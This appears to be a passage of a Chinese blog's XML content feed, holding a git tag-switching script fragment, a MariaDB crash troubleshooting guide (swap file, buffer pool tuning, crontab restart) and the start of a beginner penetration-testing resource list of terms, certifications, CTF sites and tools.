keyword">exit</span> 1  <span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 切换 tag (注意 tag 是基线，不需要也不能通过 pull 更新代码)</span><span class="token comment" spellcheck="true"># git checkout -b &lt;local_branch> &lt;tag></span><span class="token keyword">else</span>  <span class="token keyword">echo</span> <span class="token string">"Switch to tag <span class="token variable">${GITTAG}</span> ..."</span>  tag<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> tag <span class="token operator">|</span> <span class="token function">grep</span> $<span class="token punctuation">{</span>GITTAG<span class="token punctuation">}</span><span class="token variable">)</span></span>  branch<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> branch -a <span class="token operator">|</span> <span class="token function">grep</span> $<span class="token punctuation">{</span>GITTAG<span class="token punctuation">}</span><span class="token variable">)</span></span>  <span class="token comment" spellcheck="true"># 若 tag 存在</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">${tag}</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token comment" spellcheck="true"># 若未创建该 tag 对应的本地分支，则创建并切换到该分支</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">${branch}</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token function">git</span> checkout -b <span class="token variable">${GITTAG}</span> <span class="token variable">${GITTAG}</span>    <span class="token comment" spellcheck="true"># 若已创建该 tag 对应的本地分支，则直接切换到该分支</span>    <span class="token keyword">else</span>      <span class="token function">git</span> checkout <span class="token variable">${GITTAG}</span>    <span class="token keyword">fi</span>  <span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"Error: tag '<span class="token variable">${GITTAG}</span>' is not exists."</span>    <span class="token keyword">exit</span> 1  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token keyword">echo</span> <span class="token string">"Finish: Git Repository has been updated to : <span class="token variable">${TARGET}</span>"</span><span class="token keyword">exit</span> 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 开发/语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mariadb 周期性崩溃问题处理：Error establishing a database connection</title>
      <link href="/website/mariadb-zhou-qi-xing-beng-kui-chu-li-ji-lu/"/>
      <url>/website/mariadb-zhou-qi-xing-beng-kui-chu-li-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><ul><li>建站环境：Centos7 + LAMP + WordPress</li><li>物理内存：2G</li><li>相关插件：Redis Object Cache （Redis缓存加速）</li><li>数据库：Mariadb + Redis （均使用默认数据库配置）</li><li>异常现象：几乎<strong>很规律地每周一次</strong>打开站点时提示<code>Error establishing a database connection</code></li><li>临时恢复手段：重启 Marridb 进程</li></ul><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>刚开始以为是偶发的，就没在意，但是数个月来都是每周一次，就实在是折腾人了。</p><p>最初分析以为是 Redis Object Cache 插件导致的（怀疑是Redis缓存数据过期引起的雪崩），但是关掉Redis Object Cache 之后依旧是每周一次，那就<strong>肯定是Mariadb自身的问题</strong>了。</p><p>而且这个问题有几个很有意思的关键点：</p><ul><li>很有规律地每周一次（当然是基于我的环境而言，不同的环境触发时机可能不同）</li><li>Mariadb数据库未做过任何配置优化（纯粹使用默认配置）</li><li>每次都可以通过重启Mariadb进程恢复</li></ul><p>不难联想到是内存导致的（事后也证实了是这个原因），而重启Mariadb进程可以解决是因为做了内存的释放与再分配。</p><h2 id="原因定位"><a href="#原因定位" class="headerlink" title="原因定位"></a>原因定位</h2><p>首先去核查Mariadb数据库的异常日志，确认数据库崩溃的时候都发生了些什么。</p><p>如果不知道异常日志的位置，可以通过输入以下命令，利用Mariadb的进程信息找到它：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> mariadb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若Mariadb正在运行，会返回类似于以下的信息：</p><blockquote><p>mysql    31877 31532  0 16:07 ?        00:00:04<br>/usr/libexec/mysqld –basedir=/usr –datadir=/var/lib/mysql –plugin-dir=/usr/lib64/mysql/plugin <font color="red">–log-error=/var/log/mariadb/mariadb.log</font> –pid-file=/var/run/mariadb/mariadb.pid –socket=/var/lib/mysql/mysql.sock –port=3306</p></blockquote><p>其中log-error就是异常日志的位置，这里为：</p><blockquote><p>/var/log/mariadb/mariadb.log</p></blockquote><p>通过<code>tail /var/log/mariadb/mariadb.log</code>命令可查看最近发生的异常。</p><p>具体的日志我就不全部贴出来了，这里只拷贝日志中一些与当下要解决的问题相关的部分：</p><blockquote><p><strong># Mariadb崩溃前打印的异常</strong><br>180906  0:51:40 InnoDB: Fatal error: <font color="red">cannot allocate <strong>memory</strong> for the buffer pool</font><br>180807 19:30:09 [ERROR] mysqld: <font color="red">Out of <strong>memory</strong></font> (Needed 128917504 bytes)<br>180908 13:56:25 InnoDB: <font color="red">The InnoDB <strong>memory</strong> heap is disabled</font><br>**# Mariadb重启后打印的信息**<br>180910  8:04:41 InnoDB: Initializing <font color="blue">buffer pool, size = 128.0M</font><br>180910  8:04:41 InnoDB: Completed initialization of buffer pool</p></blockquote><p>前三行就是导致<code>Error establishing a database connection</code>异常的罪魁祸首，在一次数据库崩溃的时候不一定都会出现，但他们所描述的大概意思都是差不多的：由于机器内存不足，无法分配给InnoDB缓冲池足够的内存，导致InnoDB无法启用。</p><p>后两行是Mariadb重启后打印的，意思是：成功分配给InnoDB缓冲池128M内存（<strong>具体分配多少内存是视Mariadb的实际配置而定的</strong>）。</p><p>需知道Mariadb本质上就是Mysql的分支，因此也具备了InnoDB和MyISAM两种存储引擎。而InnoDB的缓存机制与MyISAM的最大区别就在于，InnoDB不仅仅缓存索引，还会缓存实际的数据。所以<strong>使用InnoDB的前提是要有足够大的物理内存</strong>。</p><blockquote><p>在Mariadb的服务配置文件中有一个innodb_buffer_pool_size 参数，它用来设置InnoDB缓存用户表及索引数据的最主要缓存空间，对InnoDB整体性能影响也最大。</p></blockquote><p>其实前面说了这么多，<font color="red"><strong>总结下来就是</strong></font>：</p><p>Mariadb没有配置好InnoDB，WordPress本身就比较占资源，站点访问量稍微大一些，之前已分配给InnoDB的内存就满了。机器内存由于还提供了其他应用服务，剩余内存不够InnoDB重分配，而<strong>机器本身又没有针对垃圾内存的释放策略</strong>，于是Mariadb进程就锁死了。最终WordPress由于无法连接到数据库，在站点页面打印了异常<code>Error establishing a database connection</code>。</p><h2 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h2><p>其实这个问题多发于内存低配的服务器上，内存高配服务器并不明显。</p><p>但无论低配还是高配服务器，都需要具备一套针对内存不足时的处理策略。现在既然知道到了问题的根本原因，就能定制出对应的处理方案：</p><ul><li><strong>减少InnoDB需求的内存</strong>：这是直观上处理手段，但是指标不治本，只是问题的触发周期延长了而已。</li><li><strong>优化服务器的内存处理策略</strong>：推荐建立合理的交换分区swap（类似于虚拟内存技术），可从根本上解决问题。</li><li><strong>建立Mariadb进程的守护进程</strong>：这是备用的补救措施，如可通过crontab命令检测Mariadb进程状态，发生异常时即时重启。</li></ul><h2 id="创建交换分区swap"><a href="#创建交换分区swap" class="headerlink" title="创建交换分区swap"></a>创建交换分区swap</h2><p>swap（即交换分区）是在Linux上较为推崇的、类似于Windows的虚拟内存技术。具备swap的Linux，当遇到物理内存不足的情况，就可以把部分硬盘空间当成虚拟内存使用，从而解决了物理内存不足的问题。</p><p>Linux把物理内存划分为多个内存段，称为页面。而交换就是指内存页面被复制到预先设定好的硬盘空间（即交换空间）的过程，目的是释放掉页面的内存，供其他应用使用。物理内存和交换空间的总大小是可用的虚拟内存的总量。</p><p>下面描述如何在Centos上创建交换分区。</p><p>首先需要使用<code>root用户</code>登陆系统。</p><p>通过<code>free -mh</code>命令查看内存和swap的分配情况，<strong>默认Centos是没有设置swap的，因此swap分区的大小是0</strong>：</p><blockquote><p>　　　　total　　used　　　free　　shared　buff/cache　available<br>Mem: 　　　1.8G　　662M　　210M　　560K　　　965M　　　1.0G<br><font color="red">Swap:　　　　0　　　　0　　　　0</font></p></blockquote><p>当然也可以通过<code>swapon -s</code>命令查看已经配置的swap空间（但若无配置swap空间则此命令无任何反应）。</p><p>按照习惯，<strong>建议swap交换分区的大小为实际物理内存的2~2.5倍</strong>。在本例中的物理内存是2G，因此这里创建4G的交换分区。</p><p>此前先通过<code>df -h</code>命令查看硬盘是否有大于4G的可用空间（本例中可见剩余36G，足够了）：</p><blockquote><p>Filesystem　　Size　Used　Avail　Use%　Mounted on<br>　/dev/vda1　　　50G　　12G　<font color="red">36G</font>　25%　　　/<br>　devtmpfs　　　909M    　 0　　909M　0%　　　/dev<br>　tmpfs　　　　　920M　24K　920M　1%　　　/dev/shm<br>　tmpfs　　　　　920M　460K　919M　1%　　/run<br>　tmpfs　　　　　920M　　0　　920M　0%　　/sys/fs/cgroup<br>　tmpfs　　　　　184M　　0　　184M　0%　　/run/user/0</p></blockquote><p>使用<code>dd</code>命令创建swap交换分区文件<code>/home/swap</code>，大小为4G（由于较大，可能耗时较久）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">dd</span> if<span class="token operator">=</span>/dev/zero of<span class="token operator">=</span>/home/swap bs<span class="token operator">=</span>1024 count<span class="token operator">=</span>4096000<span class="token comment" spellcheck="true"># 命令参数解析</span><span class="token comment" spellcheck="true"># if=&lt;文件>：代表输入文件，默认从stdin中读取输入。/dev/zero 是一个字符设备，会不断返回0值字节（\0）</span><span class="token comment" spellcheck="true"># of=&lt;文件>：代表输出文件，默认以stdout作为输出</span><span class="token comment" spellcheck="true"># bs=&lt;单个块的字节数>：交换分区的读写是以block（块）为单位的，每个block的大小默认为1K，即1024字节</span><span class="token comment" spellcheck="true"># count=&lt;块数>：交换分区文件的block数，count*bs就是交换分区的大小</span><span class="token comment" spellcheck="true"># 若创建成功则返回：</span><span class="token comment" spellcheck="true"># 4096000+0 records in</span><span class="token comment" spellcheck="true"># 4096000+0 records out</span><span class="token comment" spellcheck="true"># 4194304000 bytes (4.2 GB) copied, 40.4638 s, 104 MB/s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个<strong>交换分区文件</strong>上创建<strong>交换分区</strong>：</p><pre class="line-numbers language-bash"><code class="language-bash">mkswap /home/swap<span class="token comment" spellcheck="true"># 若创建成功则返回：</span><span class="token comment" spellcheck="true"># Setting up swapspace version 1, size = 4095996 KiB</span><span class="token comment" spellcheck="true"># no label, UUID=ec9e00e2-3d82-4bc0-bc99-e2e4837dcca5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>激活交换分区：</p><pre class="line-numbers language-bash"><code class="language-bash">swapon /home/swap<span class="token comment" spellcheck="true"># 若激活成功则返回：</span><span class="token comment" spellcheck="true"># swapon: /home/swap: insecure permissions 0644, 0600 suggested.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再次通过<code>free -mh</code>命令查看内存和swap的分配情况：</p><blockquote><p>　　　　total　　used　　　free　　shared　buff/cache　available<br>Mem: 　　　1.8G　　662M　　210M　　560K　　　965M　　　1.0G<br><font color="red">Swap:　　　3.9G　　　　0B　　　3.9G</font></p></blockquote><p>或通过<code>swapon -s</code>命令查看本机已配置的swap空间：</p><blockquote><p>Filename　　　Type　　　　Size　Used　Priority<br>/home/swap　　　　file　　4095996　　0　　　-1</p></blockquote><p>为了避免系统重启后交换分区失效，需要<strong>设置交换分区在开机后自动挂载</strong>。</p><p>由于系统开机时会主动读取<code>/etc/fstab</code>文件里的配置进行磁盘挂载，这样只需要将交换分区的挂载信息写入这个文件中就可以了。</p><p>通过命令<code>vi /etc/fstab</code>编辑文件，在末尾增加下面一行并保存即可：</p><pre class="line-numbers language-bash"><code class="language-bash">/home/swap           swap                 swap       defaults              0 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><font color="red">至此交换分区创建完成。</font></p><h2 id="附1：减少InnoDB的需求缓存"><a href="#附1：减少InnoDB的需求缓存" class="headerlink" title="附1：减少InnoDB的需求缓存"></a>附1：减少InnoDB的需求缓存</h2><p>一般来说，设置了交换分区就已经解决了这个问题了。但这里还是附上裁减InnoDB缓存的设置方法，针对一些内存极少的机器还是需要的。</p><p>首先登陆到Mariadb数据库<code>mysql -u root -p</code>，通过SQL查看当前InnoDB缓存是多大（若未修改过任何配置，默认情况下应该是128M）：</p><pre class="line-numbers language-sql"><code class="language-sql"> <span class="token keyword">SELECT</span> @<span class="token variable">@innodb_buffer_pool_size</span><span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> @<span class="token variable">@innodb_buffer_pool_size</span><span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span>                        <span class="token number">128.00000000</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若要变更，只需在Mariadb配置文件修改·innodb_buffer_pool_size·参数大小即可。</p><p>默认情况下，Centos的Mariadb配置文件位置为：</p><blockquote><p>/etc/my.cnf</p></blockquote><p>但是官方并不推荐修改这个配置文件，因为当Mariadb升级时很可能会将其覆盖掉。不过这个配置文件会包含了一个配置目录<code>/etc/my.cnf.d</code>，其下的全部配置文件都会被包含进来。默认情况下，目录<code>/etc/my.cnf.d</code>内有三个配置文件：</p><blockquote><p>/etc/my.cnf.d/client.cnf<br>/etc/my.cnf.d/mysql-clients.cnf<br>/etc/my.cnf.d/server.cnf</p></blockquote><p>一般情况下，我们只需修改<code>/etc/my.cnf.d/server.cnf</code>配置文件即可。但是也可以在<code>/etc/my.cnf.d</code>目录下创建新的配置文件（它将被<code>/etc/my.cnf</code>自动包含）。</p><p>在本例中我们选择后者，即在<code>/etc/my.cnf.d</code>目录下创建新的配置文件。</p><p>打开<code>/usr/share/mysql</code>目录，可以发现这里有一些现成的mysql数据库样例配置文件，对应不同的使用场景：</p><blockquote><p>my-huge.cnf<br>my-innodb-heavy-4G.cnf<br>my-large.cnf<br>my-medium.cnf<br>my-small.cnf</p></blockquote><p>这里把<code>my-medium.cnf</code>拷贝过来：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/mysql/my-medium.cnf /etc/my.cnf.d/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过命令<code>vi /etc/my.cnf.d/my-medium.cnf</code>编辑配置文件，找到<code>innodb_buffer_pool_size</code>参数，去掉前面的#注释并修改成期望的大小即可（本文改成了32M）。</p><p>修改完成后，需重启Mariadb服务使其生效：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart mariadb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="附2：利用crontab守护Mariadb"><a href="#附2：利用crontab守护Mariadb" class="headerlink" title="附2：利用crontab守护Mariadb"></a>附2：利用crontab守护Mariadb</h2><p>作为备用方案，可利用crontab实时监控Mariadb的进程状态，万一崩溃则自动重启Mariadb进程，这样在最坏的情况下也能保证站点的正常使用了。</p><p>crontab是Centos内置的定时计划服务，可以用以下命令启动和停止服务：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start crond.service   <span class="token comment" spellcheck="true"># 启动crontab服务</span>systemctl stop crond.service    <span class="token comment" spellcheck="true"># 停止crontab服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用<code>crontab -e</code>命令在crontab添加一行计划任务（拷贝下面的命令到末尾保存即可）：<font color="red">每分钟对Mariadb进程进行检查，若进程不存在则重新启动数据库服务</font>：</p><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * <span class="token keyword">if</span> <span class="token punctuation">[</span> -z `ps -ef<span class="token operator">|</span><span class="token function">grep</span> mariadb<span class="token operator">|</span><span class="token function">grep</span> -v <span class="token function">grep</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span>` <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span> systemctl start mariadb<span class="token punctuation">;</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 此计划任务解释：</span><span class="token comment" spellcheck="true"># */1 * * * *： 是cron表达式，这里表示每分钟执行一次。cron的语法可自行谷歌或百度</span><span class="token comment" spellcheck="true"># ps -ef：表示查看当前运行中的进程列表</span><span class="token comment" spellcheck="true"># grep mariadb：表示仅保留包含mariadb关键字的进程</span><span class="token comment" spellcheck="true"># grep -v grep：表示排除包含grep关键字的进程</span><span class="token comment" spellcheck="true"># awk '{print $2}'：表示提取进程号</span><span class="token comment" spellcheck="true"># -z：表示判断进程号是否为空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重载或重启crontab使配置生效：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl reload crond.service   <span class="token comment" spellcheck="true"># 重载crontab配置</span>systemctl restart crond.service   <span class="token comment" spellcheck="true"># 重启crontab服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过<code>crontab -l</code>命令可确认当前用户的计划任务列表。</p><p>需注意crontab默认不会开机自启，可编辑<code>vi /etc/rc.d/rc.local</code>文件，在末尾添加以下内容并保存即可：</p><blockquote><p>systemctl start crond.service</p></blockquote><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10657460">本文全文下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mariadb </tag>
            
            <tag> WordPress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白帽子渗透测试入门资源：参考书、课程、工具、认证</title>
      <link href="/safe/bai-mao-zi-shen-tou-ce-shi-ru-men-zi-yuan/"/>
      <url>/safe/bai-mao-zi-shen-tou-ce-shi-ru-men-zi-yuan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>初入渗透测试领域，过程中遇到不少错综复杂的知识，也遇到不少坑，特此记录，慢慢整理慢慢填。</p><h2 id="名词解析"><a href="#名词解析" class="headerlink" title="名词解析"></a>名词解析</h2><table><thead><tr><th align="center">名词</th><th align="center">全称</th><th align="center">解析</th></tr></thead><tbody><tr><td align="center"><a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">PwK</a></td><td align="center">Penetration Testing with Kali Linux</td><td align="center">Kali-Linux 渗透测试培训课程</td></tr><tr><td align="center"><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/">OSCP</a></td><td align="center">Offensive Security Certified Professional</td><td align="center">攻防安全专家认证</td></tr><tr><td align="center"><a href="https://www.owasp.org/">OWASP</a></td><td align="center">Open Web Application Security Project</td><td align="center">开放式Web应用程序安全项目<br>它提供有关计算机和互联网应用程序的公正、实际、<br>有成本效益的信息，如<a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project">《2017 Top 10 应用风险评估报告》</a><br>其目的是协助个人、企业和机构来发现和使用可信赖软件</td></tr><tr><td align="center">SCAP</td><td align="center">Security Content Automation Protocol</td><td align="center">安全内容自动化协议<br>已成立了<a href="http://www.scap.org.cn/">SCAP中文社区</a>，集成了协议框架中的CVE、CCE、<br>CPE、CWE、CVSS、OVAL等6种网络安全相关标准数据库</td></tr><tr><td align="center">CVE</td><td align="center">Common Vulnerabilities and Exposures</td><td align="center">公共漏洞与暴露<br>每个CVE都有唯一编号，是一个漏洞字典表</td></tr><tr><td align="center">EXP</td><td align="center">Exploit</td><td align="center">安全术语，指可利用点（如漏洞、代码等）</td></tr><tr><td align="center">vul</td><td align="center">Vulnerabilities</td><td align="center">安全术语，泛指漏洞</td></tr><tr><td align="center">PoC</td><td align="center">Proof of Concept</td><td align="center">漏洞的概念证明，常见是一段可复盘漏洞的代码</td></tr><tr><td align="center">payload</td><td align="center">-</td><td align="center">安全术语，有效载荷，泛指漏洞利用成功后所要做的事情<br>（如Cracker会做一些有害的或者恶性的动作）</td></tr><tr><td align="center">shellcode</td><td align="center">-</td><td align="center">安全术语，payload的一种，让攻击者获得 shell<br>（由于其建立正向/反向shell而得名）</td></tr><tr><td align="center">WAF</td><td align="center">Web Application Firewall</td><td align="center">Web应用防护系统（也称为：网站应用级入侵防御系统）</td></tr><tr><td align="center">Fuzz</td><td align="center">Fuzz testing</td><td align="center">模糊测试，一种安全测试方法<br>它介于完全的手工测试和完全的自动化测试之间<br>而手工测试是指渗透测试，即模拟Cracker进入系统查找漏洞</td></tr><tr><td align="center">社工</td><td align="center">社会工程学攻击</td><td align="center">安全术语，泛指通过心理战术，欺诈他人<br>以收集信息、行骗和入侵计算机系统的行为</td></tr><tr><td align="center">XSS</td><td align="center">Cross Site Scripting</td><td align="center">跨站脚本攻击（缩写首字母为X是为了不与CSS混淆）<br>根据攻击特点分为：反射型XSS、存储型XSS、DOM-XSS</td></tr><tr><td align="center">DoS</td><td align="center">Denial of Service</td><td align="center">拒绝服务攻击</td></tr><tr><td align="center">DDoS</td><td align="center">Distributed Denial of Service</td><td align="center">分布式拒绝服务攻击</td></tr><tr><td align="center">SQLi</td><td align="center">SQL Inject</td><td align="center">SQL注入式攻击</td></tr><tr><td align="center">CSRF</td><td align="center">Cross-site request forgery</td><td align="center">跨站请求伪造攻击</td></tr><tr><td align="center">CORS</td><td align="center">Cross-Origin Resource Sharing</td><td align="center">跨源资源共享</td></tr><tr><td align="center"><a href="https://gdpr-info.eu/">GDPR</a></td><td align="center">General Data Protection Regulation</td><td align="center">通用数据保护条例，在2018-5-25由欧盟正式出台<br>该条例的适用范围极为广泛，任何收集、传输、保留<br>或处理涉及到欧盟所有成员国内的个人信息的机构组织<br>均受该条例的约束，号称<a href="http://zhuanlan.51cto.com/art/201801/563326.htm">史上最严个人数据保护条例</a></td></tr></tbody></table><blockquote><p>想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 <code>PoC</code>，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了他家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 <code>Exp</code>，你在他家所做的行为就是不同的 <code>Payload</code>，就把窃听器当作 <code>Shellcode</code> 吧！</p></blockquote><h2 id="Pwk课程与OSCP证书"><a href="#Pwk课程与OSCP证书" class="headerlink" title="Pwk课程与OSCP证书"></a>Pwk课程与OSCP证书</h2><p><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/"><strong>OSCP认证</strong></a>：是一个专门针对 <a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/"><strong>PwK课程</strong></a> 的国际安全专业认证。该认证机构声称，OSCP认证是一个区别于所有其它认证的考试，考试全程采取手动操作实战的方式，而不设笔试环节。这是在安全领域含金量非常高的国际认证。</p><p><strong>认证条件</strong>：无</p><p><strong>考试模式</strong>：OSCP的认证考试也是另类的存在，考生拥有24小时的时间（实际是23小时45分钟）去完成考试，具体如何分配时间由考生自己决定。题目是5台主机（随机抽取），目标是攻入并拿到最高权限（ROOT/SYSTEM）。基于难度级别，成功执行的攻击会获得相应的积分。24小时结束之后，你还有24小时去完成并提交考试报告（需要详细说明攻击步骤和里程碑截屏来证明确实攻破并获得相应权限）。</p><p><strong>考试费用</strong>：最低 $ 800 （30天实验室访问学习 + 考试认证）</p><p><strong>相关链接</strong>：</p><ul><li><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/">OSCP概述</a> </li><li><a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">PwK培训材料</a> </li></ul><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>Capture The Flag，夺旗赛。</p><p>通过在线靶场进行实战，磨炼网络安全技巧的一种竞技。这里推荐几个免费的 CTF 站点：</p><ul><li><a href="https://www.root-me.org/?lang=en">Root Me</a></li><li><a href="https://cgctf.nuptsast.com/challenges#Web">CG-CTF</a></li><li><a href="https://github.com/vulhub/vulhub">Vulhub</a></li></ul><p>不建议找答案，勇敢地刷题吧！ 可以很好地锻炼发掘EXP的能（nao）力（dong）~</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><table><thead><tr><th align="center">工具</th><th align="center">简介</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Kali-Linux</td><td align="center">渗透测试的必备工具包<br>Kali是一个基于 Debian 的 Linux 发行版，专门用于渗透测试的工具系统<br>大多数做安全测试的渗透和审计开源工具都被尽可能多地囊括在内</td><td align="center"><a href="https://www.kali.org/downloads/" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">CVEList</td><td align="center">CVE字典表</td><td align="center"><a href="https://github.com/CVEProject/cvelist" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">SecLists</td><td align="center">OWASP维护的一个安全信息列表集合<br>该集合包括了用于渗透的各种类型的列表，<br>这些列表包含了237个字典文件以及常用的 Web Shell 攻击载荷，<br>字典文件类型众多，如用户名、密码、域名、敏感数据特征码、模糊测试载荷等</td><td align="center"><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Exploit Database</td><td align="center">可利用漏洞数据库（在线）<br>罗列了最新被发现的CVE和PoC等信息，可用于学习漏洞原理和复盘</td><td align="center"><a href="https://www.exploit-db.com/" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">SearchSploit</td><td align="center">与 Exploit Database 配套的命令行工具包（已集成到Kali）<br>它把Exploit Database的数据保存在本地机器（攻击方），<br>通过搜集目标机器（防御方）的信息，在本地发现这些信息的EXP，<br>然后在本地机器提取对应的PoC上传到目标机器实现渗透</td><td align="center"><a href="https://www.exploit-db.com/searchsploit" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">Hydra</td><td align="center">弱密码爆破工具（已集成到Kali）</td><td align="center"><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Burp Suite</td><td align="center">用于攻击web 应用程序的集成平台（谁用谁知道）</td><td align="center"><a href="https://portswigger.net/burp" 